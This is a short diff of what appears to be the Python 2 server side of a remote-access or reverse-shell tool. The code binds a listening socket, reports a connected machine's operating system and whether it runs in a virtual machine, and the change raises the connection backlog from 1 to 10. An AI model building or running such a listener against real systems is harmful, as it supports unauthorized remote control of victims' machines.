@@ -75,7 +75,6 @@ $$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 clear()
 heading()
 def mess():
-    sleep(5)
     print '[*] Oᴘᴇʀᴀᴛɪᴏɴᴀʟ Sʏsᴛᴇᴍ: ' + data2
     if vm == 'True':
         print '[*] Vɪʀᴛᴜᴀʟ ᴍᴀᴄʜɪɴᴇ: {0}Dᴇᴛᴇᴄᴛᴇᴅ{1}'.format(RED, END) 
@@ -92,7 +91,7 @@ print '[!] Wᴀɪᴛɪɴɢ ꜰᴏʀ ᴄᴏɴɴᴇᴄᴛɪᴏɴs '
 s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 s.bind((HOST, PORT))
 print "[*] Lɪsᴛᴇɴɪɴɢ ᴏɴ: 0.0.0.0:%s" % str(PORT)
-s.listen(1)
+s.listen(10)
 conn, addr = s.accept()
 print '[*] Cᴏɴɴᴇᴄᴛɪᴏɴ: ' + '{0}ESTABLISHED{2}'.format(GREEN, WHITE, END)
 data = conn.recv(1024) 
